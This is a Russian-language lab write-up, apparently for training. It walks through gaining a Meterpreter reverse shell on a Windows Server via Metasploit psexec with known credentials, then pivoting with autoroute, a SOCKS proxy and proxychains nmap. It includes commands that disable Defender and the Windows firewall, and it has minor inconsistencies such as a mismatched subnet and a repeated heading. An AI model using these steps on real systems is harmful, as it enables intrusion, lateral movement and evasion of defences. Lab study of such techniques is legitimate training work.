
### Получение стабильной сессии Meterpreter

**Исходные данные:**
- Windows Server 2022 (192.168.211.10), домен `lab.local`.
- Учётные данные: пользователь `ansible` с паролем `Pass123!`.
- Windows Defender на сервере отключён (`Set-MpPreference -DisableRealtimeMonitoring $true`).
- Атакующая машина: Kali Linux (192.168.47.52) в сети VMnet1.

**Выполнение:**

Запускаем Metasploit Framework:

```bash
msfconsole
```

Выбираем модуль `exploit/windows/smb/psexec` – он позволяет выполнить произвольный код на удалённой Windows-системе через SMB с использованием механизма служб.

```bash
use exploit/windows/smb/psexec
```

Устанавливаем необходимые параметры:

```bash
set RHOSTS 192.168.211.10
set SMBUser ansible
set SMBPass Pass123!
set SMBDomain lab
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.47.52
set LPORT 4444
set EXITFUNC thread
```

- `EXITFUNC thread` – обеспечивает более чистый выход полезной нагрузки без завершения процесса-родителя.
- `PAYLOAD` выбран 64-битный для совместимости с целевой ОС.

Запускаем эксплуатацию:

```bash
run
```

## Добавление маршрута через autoroute

**Выполненные команды:**

```bash
use post/multi/manage/autoroute
set SESSION 2
set SUBNET 192.168.47.0
set NETMASK 255.255.255.0
show options
run
```

```
[*] Running module against WIN-PV2912HIM2M (192.168.211.10)
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.168.211.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```

## Запуск SOCKS-прокси

**Выполненные команды:**

```bash
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j
```

**Вывод:**

<img width="546" height="180" alt="{F1B1375E-A49A-4850-AEA2-5817B6115232}" src="https://github.com/user-attachments/assets/526be38d-9276-4a5d-9c3f-43b43b63e25e" />

```
msf auxiliary(server/socks_proxy) >

```

**Результат:** SOCKS4a прокси-сервер запущен на порту 1080 (localhost). Теперь любой инструмент, поддерживающий SOCKS4a (например, proxychains), сможет направлять трафик через Metasploit, который в свою очередь туннелирует его через сессию 2 (Windows Server) в подсети 192.168.47.0/24 и 192.168.211.0/24.

## Запуск SOCKS-прокси

На Windows Dekstop выполняем команду для отключения брандмаузера:

```
netsh advfirewall set allprofiles state off
```

```bash
proxychains nmap -sT -Pn -n -p 445 192.168.47.50
```
